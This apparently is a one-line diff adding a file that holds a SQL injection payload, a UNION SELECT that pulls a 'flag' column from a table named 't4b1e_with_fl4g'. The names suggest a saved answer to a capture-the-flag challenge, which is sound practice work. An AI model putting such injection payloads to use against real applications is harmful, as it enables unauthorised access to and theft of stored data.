@@ -1,0 +1,1 @@
+contract ' UNION SELECT null, null, t4b1e_with_fl4g.flag FROM t4b1e_with_fl4g -- h
